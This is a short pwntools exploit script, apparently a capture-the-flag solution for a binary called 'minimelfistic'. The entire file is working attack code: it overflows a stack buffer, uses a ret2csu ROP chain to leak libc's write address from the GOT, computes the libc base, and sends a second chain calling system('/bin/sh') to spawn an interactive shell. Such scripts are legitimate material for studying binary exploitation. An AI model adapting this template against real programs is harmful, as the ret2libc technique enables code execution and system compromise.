#!/usr/bin/python3

from pwn import *

libc = ELF('./libc.so.6')

context.binary = elf = ELF('./minimelfistic')
context.update(arch='amd64', os='linux')

con = process()

con.recvuntil(b'>')

rop = ROP(elf)
rop.raw(b'9' + b'A' * 71)
rop.ret2csu(0x1, elf.got['write'], 0x8)
rop.call(elf.plt['write'])
rop.call(elf.sym['main'])

con.sendline(rop.chain())

con.recvline()
con.recvline()
con.recvline()

libc_write = u64(con.recvline().strip().ljust(8, b'\x00'))
libc.address = libc_write - libc.sym['write']

con.recvuntil(b'>')

rop = ROP(libc)
rop.raw(b'9' + b'A' * 71)
rop.system(next(libc.search(b'/bin/sh\x00')))

con.sendline(rop.chain())

con.interactive()
